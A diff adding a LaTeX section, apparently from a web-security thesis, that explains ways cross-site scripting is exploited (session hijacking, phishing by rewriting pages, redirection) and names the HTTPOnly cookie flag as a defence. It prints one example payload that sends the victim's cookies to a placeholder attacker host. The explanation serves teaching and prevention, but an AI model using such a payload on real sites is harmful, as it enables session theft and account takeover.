@@ -1,0 +1,23 @@
+
+\subsection{Attacks using XSS}
+Once the attacker finds a vulnerability has several ways to exploit it. Knowing the diverse ways a XSS can be used is useful to prevent it.
+
+\subsubsection{Session hijacking attack}
+The goal of this attack is to steal the session cookies to impersonate the user. A payload like this can send the cookies to a remote server controlled by the attacker passing the cookies as a parameter.
+
+\verb|<script>document.InnerHTML += "<img src='http://attackersite.com/?cookie="+ document.cookie + "/'>" </script>|
+
+This attack can be easily countered by setting the session cookies with the flag HTTPOnly, that we explained earlier in the cookies chapter.
+
+\subsubsection{Phishing attack}
+This attack overwrites the HTML of the website to trick the user into sending login credentials to the attacker. For example the payload can modify a form to submit the contents to a malicious server, or even modify the current page to make it look like the login page.
+
+\subsubsection{Others}
+JavaScript can interact with a lot of parts of the browser, and this makes XSS exploits very powerful. The attacker imagination is the limit but we can name a few more ways to exploit a XSS.
+
+\begin{itemize}
+	\item Redirect the victim to another URL.
+	\item Modify the page with fake information.
+	\item Recollect user information.
+	\item Find browser version to send a targeted exploit.
+\end{itemize}
